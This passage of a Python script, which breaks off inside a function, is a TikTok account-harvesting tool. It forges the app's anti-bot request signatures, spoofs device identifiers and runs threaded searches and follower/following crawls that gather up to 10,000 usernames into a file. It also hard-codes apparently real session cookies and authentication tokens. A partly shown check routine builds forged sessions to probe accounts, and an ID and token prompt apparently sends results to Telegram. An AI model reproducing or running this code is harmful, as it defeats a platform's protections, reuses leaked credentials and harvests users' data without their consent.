from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys
import http.client
import requests
import re
from time import time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import binascii
import uuid
import random
import names
import json
import secrets
from urllib.parse import urlencode
import uuid
import locale
import binascii
import uuid
import random
import os
from urllib.parse import urlencode
import random;import os,requests
import requests,random
import os
import requests
import random
import time
from MedoSigner import Argus,Gorgon, md5,Ladon
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
import zlib
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
Pk = '\x1b[38;5;231m'  # أبيض مخصص	

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data=payload
        if not unix: unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}
params = {
              "request_tag_from": "h5",
              "fixed_mix_mode": "1",
              "mix_mode": "1",
             # "account_param":user,
                'passport-sdk-version':'0',
                'app_language':'en',
              "scene": "4",
              "device_platform": "android",
              "os": "android",
              "ssmix": "a",
                  '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
                'cdid': str(uuid.uuid4()),
              "channel": "googleplay",
              "aid": "1233",
              "app_name": "musical_ly",
              "version_code": "360505",
              "version_name": "36.5.5",
              "manifest_version_code": "2023605050",
              "update_version_code": "2023605050",
              "ab_version": "36.5.5",
              "resolution": "1440*2969",
              "dpi": "532",
              "device_type": "SM-S928B",
              "device_brand": "samsung",
              "language": "EN",
              "os_api": "34",
              "os_version": "14",
              "ac": "wifi",
              "is_pad": "0",
              "current_region": "US",
              "app_type": "normal",
              "sys_region": "US",
              "last_install_time": "1729289943",
              "mcc_mnc": "41820",
              "timezone_name": "Asia/Baghdad",
              "carrier_region_v2": "418",
              "residence": "US",
              "app_language": "en",
              "carrier_region": "US",
              "timezone_offset": "10800",
              "host_abi": "arm64-v8a",
              "locale": "ar",
              "ac2": "wifi",
              "uoo": "0",
              "op_region": "US",
              "build_number": "36.5.5",
              "region": "US",
              'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
                'iid': str(random.randint(1, 10**19)),
                'device_id': str(random.randint(1, 10**19)),
                'openudid': str(binascii.hexlify(os.urandom(8)).decode()),

              "support_webview": "1",
              "cronet_version": "1c651b66_2024-08-30",
              "ttnet_version": "4.2.195.8-tiktok",
              "use_store_region_cookie": "1"
            }
kse =sign(params=urlencode(params),payload="",cookie="")
                
                
class tiktok:
  def __init__(self):        
        self.main = 200
        self.users = []
        self.good1 = 0
        self.good2 = 0
        self.bad1 = 0
        self.bad2 = 0
        self.id =input(' ID : ')
        os.system('clear' if os.name == 'posix' else 'cls')
        self.tok =input(' Token : ')
        os.system('clear' if os.name == 'posix' else 'cls')
  def search1(self):
        while True:
        	try:
        		g=choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )        		
        		keyword=''.join((choice(g) for i in range(randrange(3,9))))    
        		device_id = random.randint(1000000000000000000, 9999999999999999999)
        		openudid = f"{random.randint(1000000000000000000, 9999999999999999999)}"
        		timestamp = 'FUCK_TOOL'
        		ua = generate_user_agent()
        		conn = http.client.HTTPSConnection('www.tiktok.com')
        		headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': ua,
            }
        		conn.request('GET', '/login', headers=headers)
        		response = conn.getresponse()
        		cookies = response.info().get_all('Set-Cookie')
        		ttwid = [cookie.split(';')[0].split('=')[1] for cookie in cookies if 'ttwid' in cookie][0]
        		h = {'user-agent': ua}
        		conn = http.client.HTTPSConnection('www.tiktok.com')
        		conn.request(
                    'GET',
                    '/api/search/user/full/?WebIdLastTime=1723643341&aid=1988&app_language=en&app_name=tiktok_web&browser_language=en-US&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&data_collection_enabled=true&device_id=7402991709360080390&device_platform=web_pc&focus_state=true&from_page=search&history_len=7&is_fullscreen=false&is_page_visible=true&keyword=kfjoi&odinId=7402991511904191494&os=windows&priority_region=&referer=&region=MA&screen_height=900&screen_width=1600&tz_name=Africa%2FCasablanca&user_is_login=false&verifyFp=verify_m029ckog_vDzDWJ4K_KE1s_4tGS_95ud_FwfB8SXzvA83&web_search_code=%7B%22tiktok%22%3A%7B%22client_params_x%22%3A%7B%22search_engine%22%3A%7B%22ies_mt_user_live_video_card_use_libra%22%3A1%2C%22mt_search_general_user_live_card%22%3A1%7D%7D%2C%22search_server%22%3A%7B%7D%7D%7D&webcast_language=en&msToken=jHSHkVJLmoyO7C_QnTywST8ETrMTZAeGb_gjhakarAnI69lbykkG2YFD7VEWb6n0BPFI7f8YWfqvb0W2IC08ssGIVvQMs1mJ9O56C0B0VVqbpnJBdpYqTd89h40N78VdoELhioAyGgja4VYLx0hV3NY=&X-Bogus=DFSzswVEPG2ANSFgt1Hh8lSwXQ01&_signature=_02B4Z6wo00001kJ-RSwAAIDCyES1UgByg9JCfkGAAPZl74',
                    headers=headers
                )
        		msToken = str(conn.getresponse().info()).split('Set-Cookie: msToken=')[1].split(';')[0]
        		country = random.choice([
                'BY', 'TJ', 'TM', 'KZ', 'GB', 'DE', 'ES', 'FR', 'UZ', 'IQ', 'IQ'
            ])
        		params = urlencode({
                'aid': '1988',
                'app_language': 'en',
                'app_name': 'tiktok_web',
                'browser_language': 'en',
                'browser_name': 'Mozilla',
                'browser_online': 'true',
                'browser_platform': 'Win32',
                'browser_version': '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'device_id': randrange(6999999999999999999, 7122222222222222222),
                'device_platform': 'web_pc',
                'keyword': keyword,
                'priority_region': country,
                'region': country,
                'screen_height': randrange(777, 888),
                'screen_width': randrange(1333, 1666),
                'msToken': msToken,
                'X-Bogus': 'DFSzswVLK1sANG9HSkI1-OYklT6o',
                '_signature': '_02B4Z6wo00001LRkx7AAAIDBahKfFq1mHTi0ZMMAAE696a'
            })
        		he = {
                        'accept':
                        '*/*',
                        'accept-language':
                        'ar-YE,ar-YE;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
                        'cookie':
                        'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent={"ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"}; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988={"user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"}; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt=9392403db19bcfc1eb8eb48532fd8d5e; uid_tt_ss=9392403db19bcfc1eb8eb48532fd8d5e; sid_tt=5d52768f6a4a876314ea37244edfd0d0; sessionid=5d52768f6a4a876314ea37244edfd0d0; sessionid_ss=5d52768f6a4a876314ea37244edfd0d0; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='
                        + ttwid +
                        '; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='
                        + msToken + '; msToken=' + msToken +
                        '; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                        'referer':
                        'https://www.tiktok.com/search/user?q=its.veba&t=1671705430400',
                        'sec-ch-ua':
                        '"Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile':
                        '?0',
                        'sec-ch-ua-platform':
                        '"Linux"',
                        'sec-fetch-dest':
                        'empty',
                        'sec-fetch-mode':
                        'cors',
                        'sec-fetch-site':
                        'same-origin',
                        'user-agent':
                        'Mozilla/5.0 (Linux; Android 12; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
                    }
        		
        		users = set()
        		rr = requests.get('https://www.tiktok.com/api/search/user/full/',params=params,headers=he).json()['user_list']
        		for user in rr:
        		 	        		username=user['user_info']['unique_id']
        		 	        		if username not in users:
        		 	        			users.add(username)
        		 	        			threads = []
        		 	        			thread = Thread(target=self.mainn, args=(username,))
        		 	        			threads.append(thread)
        		 	        			thread.start()
        		 	   
        		 	        		        		 	        	
        		 	     
        		 	        		
        		 	        		
        	except Exception as e:''
       # 		print(e)
        
        
        
   
        
        
  #def randomk(self):
#  	while True:
#  		try:  		    					   
#  		    			hh = self.search1()    		    		
#  		    			for users in hh:		    				  	    				
#  		    				follower_count=users['user_info']['follower_count']
#  		    				id=users['user_info']['uid']
#  		    				username =users['user_info']['unique_id']
#  		    				if '_' not in username:
#  		    					if len(username) > 5:
#  		    						self.mainn(username)
#		    					
#  		except Exception as e:'' 
  		
  
  	
  	
  def following(self,user):
  	try:
  		
  		headers = {'user-agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
  		r = requests.get(f'https://www.tiktok.com/@{user}', headers=headers).text
  		uid = r.split('"id":"')[1].split('"')[0] 
  		sec_user_id =  r.split('"secUid":"')[1].split('"')[0]       
  	except:
  		exit('bad')  		
  	while True:
  		try:  		
  			url=f'https://api22-normal-c-useast1a.tiktokv.com/aweme/v1/user/following/list/?user_id={uid}&sec_user_id={sec_user_id}&max_time=0&count=200&offset=0&source_type=4&address_book_access=1&page_token&live_sort_by=0&device_platform=android&os=android&ssmix=a&_rticket=1704985431710&cdid=fb41a5f0-df83-4b91-b119-6e19a7279866&channel=googleplay&aid=1233&app_name=musical_ly&version_code=320803&version_name=32.8.3&manifest_version_code=2023208030&update_version_code=2023208030&ab_version=32.8.3&resolution=1600*900&dpi=300&device_type=G011A&device_brand=google&language=en&os_api=28&os_version=9&ac=wifi&is_pad=0&current_region=IQ&app_type=normal&sys_region=US&mcc_mnc=41845&timezone_name=Asia%2FShanghai&residence=IQ&app_language=en&carrier_region=IQ&timezone_offset=28800&host_abi=arm64-v8a&locale=en&ac2=wifi&uoo=0&op_region=IQ&build_number=32.8.3&region=US&ts=1704985431&iid=7322402662648219398&device_id=7322401149382018566&openudid=25922f0be19f69bc'
  	#		print(url)
  			headers ={                         
                            'X-Tt-Multi-Sids': '7322402775416292357%3A7d18aa962cfcf8fca77bd4cc53f2f057',
                            'Sdk-Version': '2',
                            'X-Bd-Kmsv': '0',
                             'X-tt-token': "03ad49115c34ecf56f6ed24814406b8b5501c5b12b2c3ebead31bb0546a75e1897244cf71f95fe783a73d606b67bc680e71f01aa7607304cd6d80e546cc2cef7c920aa26d392b75d49399aa73985b1fe9febf3dc022dbe9561e48f6bc2627e9710328-CkBkZTI4ZjQwOTkwN2EyY2RjMjljMDE5YTU3OGM4Y2EwYmZiMDQ1MmFhZGFkZjRjNzAwNzdmNTYwYmExNDU5NGMw-2.0.0",
                            'X-Ss-Req-Ticket': '1704894003013',
                            'X-Bd-Client-Key': '#aYYQaObhUSgOt56R7+aCN+UC6Bz3EHTKst8IIekx8NW0aFNbs8jroRDvUs0NLTJLhfj+K5FQtQwMdzs/',
                            'Multi_login': '1',
                            'Passport-Sdk-Version': '19',
                            'X-Tt-Dm-Status': 'login=1;ct=1;rt=1',
                            'X-Vc-Bdturing-Sdk-Version': '2.3.4.i18n',
                            'X-Tt-Store-Region': 'iq',
                            'X-Tt-Store-Region-Src': 'uid',
                            'User-Agent': 'com.zhiliaoapp.musically/2023208030 (Linux; U; Android 9; en; G011A; Build/PI;tt-ok/3.12.13.4-tiktok)',
                           'x-argus':kse["x-argus"],
                           'x-khronos': kse["x-khronos"],
                           'x-ladon':kse["x-ladon"],
                            'X-Gorgon': kse["x-gorgon"],
                            'Connection': 'Keep-Alive',
                            'Cookie': 'store-idc=alisg; store-country-code=iq; install_id=7411552813825115905; ttreq=1$cca08eda05c8107aa5599bb64c58247e84cf51c5; passport_csrf_token=7cebe28365467fd7550348e6f93bdc9b; passport_csrf_token_default=7cebe28365467fd7550348e6f93bdc9b; tt-target-idc=useast1a; d_ticket=64f70fa98963eb9e9d9e382a5f6ba2ecd6e45; multi_sids=7007451926132573185%3A29d94c6c93f97e1160567a26e0801223; cmpl_token=AgQQAPOnF-RP_bEBlsHd8J04_MYjgz8Qv4QsYNVCkQ; sid_guard=29d94c6c93f97e1160567a26e0801223%7C1725640668%7C15552000%7CWed%2C+05-Mar-2025+16%3A37%3A48+GMT; uid_tt=906649294b64642683c1e5adcc6e9c51a2ea01007d665868bb38af52f1edd167; uid_tt_ss=906649294b64642683c1e5adcc6e9c51a2ea01007d665868bb38af52f1edd167; sid_tt=29d94c6c93f97e1160567a26e0801223; sessionid=29d94c6c93f97e1160567a26e0801223; sessionid_ss=29d94c6c93f97e1160567a26e0801223; store-country-code-src=uid; odin_tt=877658efcb3ce8ab613f0f63885ef5c2134141fd0c4c90a41e9e01ff7bf67d970e5b07f80c09f2f0f6de1075062ee278611f4688e273d1e579cdcfe9ac912095a397fa2fddaf7fef81341dfdcba2ee13; msToken=qzrhj3t3aCi49vaH3ZCgK20uMYpdXGlMRji8p_lgYdZlQYLCM3U5NhKhmWWGKUNJUTr-bQ0e-who9gDY1SZ5yEU5JGwQ6QbIgJ0NtWathvDaHjqAzW4FE6FdnQ==',


                        }
  			response = requests.get(url,headers=headers).json()['followings']
  			return [user_data['unique_id'] for user_data in response]
  		except:''
  		
    		
  def main_following(self):
  	try:
  		os.system('clear' if os.name == 'posix' else 'cls')
  		print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");print(B + f"""      
 {J22}⚙ {P1}Powerful Tool {J22}⚙                       
 {J22}⚙ {P1}Author :  {J22}⚙             
 {J22}⚙ {P1}Version: 2.6 {J22}⚙            
    """);print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
  		num_users = int(input(f'{X}|{O}•{X}> {J22}Number user List :{P1}'))
  	except ValueError:
  		print("الرجاء إدخال عدد صحيح.")
  	user_list = []
  	for i in range(num_users):
  	     user = input(f'{X}|{O}•{X}>{J22} LIST {P}:{P2} {i + 1}: ')
  	     
  	     user_list.append(user)
  	all_followings = []
  	usert = set(user_list)
  	hh = 0
  	with ThreadPoolExecutor(max_workers=100) as executor, open("usernames.txt", "a") as file:
  		while hh < 10000:
  			future_to_user = {executor.submit(self.following, user): user for user in user_list}  			
  			for future in as_completed(future_to_user):
  			 user = future_to_user[future]
  			 try:
  			 	followings = future.result()
  			 	if followings:
  			 		for idx, following in enumerate(followings, start=1):
  			 			hh+=1
  			 			print(f"{X}|{O}•{X}> {J22}Done LIST {P}: {P1}{hh}. {following}")
  			 			file.write(f"{following}\n")
  			 			file.flush()
  			 		all_followings.extend(followings)
  			 		usert.update(followings)
  			 		hh += len(followings)
  			 		if hh >= 10000:
  			 			break	
  			 except Exception as e:
  			 	print(e)
  			 	
  			 	
  			 if hh < 10000 and all_followings:
  			 	user_list = [random.choice(all_followings)]
  			 else:
  			 	exit('تم سحب اللسته بنجاح')
  			 #	pass
  def followers(self,user):
  	try: 
  		headers = {'user-agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
  		r = requests.get(f'https://www.tiktok.com/@{user}', headers=headers).text
  		uid = r.split('"id":"')[1].split('"')[0] 
  		sec_user_id =  r.split('"secUid":"')[1].split('"')[0]       
  	except:
  		exit('bad')  		
  	while True:
  		try:  		
  			url=f'https://api22-normal-c-useast1a.tiktokv.com/aweme/v1/user/follower/list/?user_id={uid}&sec_user_id={sec_user_id}&max_time=0&count=200&offset=0&source_type=4&address_book_access=1&page_token&live_sort_by=0&device_platform=android&os=android&ssmix=a&_rticket=1704985431710&cdid=fb41a5f0-df83-4b91-b119-6e19a7279866&channel=googleplay&aid=1233&app_name=musical_ly&version_code=320803&version_name=32.8.3&manifest_version_code=2023208030&update_version_code=2023208030&ab_version=32.8.3&resolution=1600*900&dpi=300&device_type=G011A&device_brand=google&language=en&os_api=28&os_version=9&ac=wifi&is_pad=0&current_region=IQ&app_type=normal&sys_region=US&mcc_mnc=41845&timezone_name=Asia%2FShanghai&residence=IQ&app_language=en&carrier_region=IQ&timezone_offset=28800&host_abi=arm64-v8a&locale=en&ac2=wifi&uoo=0&op_region=IQ&build_number=32.8.3&region=US&ts=1704985431&iid=7322402662648219398&device_id=7322401149382018566&openudid=25922f0be19f69bc'
  	#		print(url)
  			headers ={                         
                            'X-Tt-Multi-Sids': '7322402775416292357%3A7d18aa962cfcf8fca77bd4cc53f2f057',
                            'Sdk-Version': '2',
                            'X-Bd-Kmsv': '0',
                             'X-tt-token': "03ad49115c34ecf56f6ed24814406b8b5501c5b12b2c3ebead31bb0546a75e1897244cf71f95fe783a73d606b67bc680e71f01aa7607304cd6d80e546cc2cef7c920aa26d392b75d49399aa73985b1fe9febf3dc022dbe9561e48f6bc2627e9710328-CkBkZTI4ZjQwOTkwN2EyY2RjMjljMDE5YTU3OGM4Y2EwYmZiMDQ1MmFhZGFkZjRjNzAwNzdmNTYwYmExNDU5NGMw-2.0.0",
                            'X-Ss-Req-Ticket': '1704894003013',
                            'X-Bd-Client-Key': '#aYYQaObhUSgOt56R7+aCN+UC6Bz3EHTKst8IIekx8NW0aFNbs8jroRDvUs0NLTJLhfj+K5FQtQwMdzs/',
                            'Multi_login': '1',
                            'Passport-Sdk-Version': '19',
                            'X-Tt-Dm-Status': 'login=1;ct=1;rt=1',
                            'X-Vc-Bdturing-Sdk-Version': '2.3.4.i18n',
                            'X-Tt-Store-Region': 'iq',
                            'X-Tt-Store-Region-Src': 'uid',
                            'User-Agent': 'com.zhiliaoapp.musically/2023208030 (Linux; U; Android 9; en; G011A; Build/PI;tt-ok/3.12.13.4-tiktok)',
                           'x-argus':kse["x-argus"],
                           'x-khronos': kse["x-khronos"],
                           'x-ladon':kse["x-ladon"],
                            'X-Gorgon': kse["x-gorgon"],
                            'Connection': 'Keep-Alive',
                            'Cookie': 'store-idc=alisg; store-country-code=iq; install_id=7411552813825115905; ttreq=1$cca08eda05c8107aa5599bb64c58247e84cf51c5; passport_csrf_token=7cebe28365467fd7550348e6f93bdc9b; passport_csrf_token_default=7cebe28365467fd7550348e6f93bdc9b; tt-target-idc=useast1a; d_ticket=64f70fa98963eb9e9d9e382a5f6ba2ecd6e45; multi_sids=7007451926132573185%3A29d94c6c93f97e1160567a26e0801223; cmpl_token=AgQQAPOnF-RP_bEBlsHd8J04_MYjgz8Qv4QsYNVCkQ; sid_guard=29d94c6c93f97e1160567a26e0801223%7C1725640668%7C15552000%7CWed%2C+05-Mar-2025+16%3A37%3A48+GMT; uid_tt=906649294b64642683c1e5adcc6e9c51a2ea01007d665868bb38af52f1edd167; uid_tt_ss=906649294b64642683c1e5adcc6e9c51a2ea01007d665868bb38af52f1edd167; sid_tt=29d94c6c93f97e1160567a26e0801223; sessionid=29d94c6c93f97e1160567a26e0801223; sessionid_ss=29d94c6c93f97e1160567a26e0801223; store-country-code-src=uid; odin_tt=877658efcb3ce8ab613f0f63885ef5c2134141fd0c4c90a41e9e01ff7bf67d970e5b07f80c09f2f0f6de1075062ee278611f4688e273d1e579cdcfe9ac912095a397fa2fddaf7fef81341dfdcba2ee13; msToken=qzrhj3t3aCi49vaH3ZCgK20uMYpdXGlMRji8p_lgYdZlQYLCM3U5NhKhmWWGKUNJUTr-bQ0e-who9gDY1SZ5yEU5JGwQ6QbIgJ0NtWathvDaHjqAzW4FE6FdnQ==',


                        }
  			response = requests.get(url,headers=headers).json()['followers']
  			return [user_data['unique_id'] for user_data in response]
  		except:''
  		    				
  def main_followers(self):
  	try:
  		os.system('clear' if os.name == 'posix' else 'cls')
  		print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");print(B + f"""      
 {J22}⚙ {P1}Powerful Tool {J22}⚙                       
 {J22}⚙ {P1}Author :  {J22}⚙             
 {J22}⚙ {P1}Version: 2.6 {J22}⚙            
    """);print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
  		num_users = int(input(f'{X}|{O}•{X}> {J22}Number user List :{P1}'))
  	except ValueError:
  		print("الرجاء إدخال عدد صحيح.")
  	user_list = []
  	for i in range(num_users):
  	     user = input(f'{X}|{O}•{X}>{J22} LIST {P}:{P2} {i + 1}: ')
  	     
  	     user_list.append(user)
  	all_followings = []
  	usert = set(user_list)
  	hh = 0
  	with ThreadPoolExecutor(max_workers=50) as executor, open("usernames.txt", "a") as file:
  		while hh < 10000:
  			future_to_user = {executor.submit(self.followers, user): user for user in user_list}  			
  			for future in as_completed(future_to_user):
  			 user = future_to_user[future]
  			 try:
  			 	followings = future.result()
  			 	if followings:
  			 		for idx, following in enumerate(followings, start=1):
  			 			hh+=1
  			 			print(f"{X}|{O}•{X}> {J22}Done LIST {P}: {P1}{hh}. {following}")
  			 			file.write(f"{following}\n")
  			 			file.flush()
  			 		all_followings.extend(followings)
  			 		usert.update(followings)
  			 		hh += len(followings)
  			 		if hh >= 10000:
  			 			break	
  			 except Exception as e:''
  		#	 	print(e)
  			 	
  			 	
  			 if hh < 10000 and all_followings:
  			 	user_list = [random.choice(all_followings)]
  			 else:
  			 	exit('تم سحب اللسته بنجاح')
  			 #	pass
  					 						
  						                         
  		
  				
  def check(self):
  	while True:
  		try:
  			with open('usernamess.txt', 'r') as file:
  				usernames = list(set(line.strip() for line in file if line.strip()))
  		
  		#	os.system('clear' if os.name == 'posix' else 'cls')
  			break  				
  		except Exception as e:		
  			exit('عذرًا، يرجى توفير ملف "usernames.txt" أولاً.')
  	for username in usernames:
  		#	 print(usernames)
  			 if '_' not in username:
  			 	ema = username.split('@')[0] if '@' in username else username  		
  			 	try:
  			 		username = ema  			
  			 		Thread(target=self.mainn,args=(username,)).start()
  			 	except Exception as e:''
  			 
  			 
  def delet(self):
  	try:
  		os.remove('usernames.txt')
  		print('Done -> تم مسح ملف اللسته')
  	except:
  		print('False -> يرجى سحب ملف اللسته اولأ')
  		



  def check2(self,email):
        while True:
          try:
          	secret = secrets.token_hex(16)
          	session = requests.Session()
          	new_uuid = str(uuid.uuid4()).replace('-', '')    
          	sid_tt = f"sid_tt={new_uuid[:16]}; "
          	sessionid = f"6632dc7e2ae6354978be6f02f13789b5"
          	cookies = {
          	"passport_csrf_token": secret,                            
          	"passport_csrf_token_default": secret,
          	"sessionid":sessionid,
          	}          	
          	session.cookies.update(cookies)          	
          	params = {
                         	'passport-sdk-version': "6030790",
                         	'iid': str(random.randint(1, 10**19)),
                         	'device_id': str(random.randint(1, 10**19)),
                         	'ac': "WIFI",
                             'channel': "googleplay",
                             'aid': "1233",
                             'app_name': "musical_ly",
                             'version_code': "360505",
                             'version_name': "36.5.5",
                             'device_platform': "android",
                             'os': "android",
          	}
     
          	mkk = sign(params=urlencode(params), payload="", cookie="")          	
          	headers = {
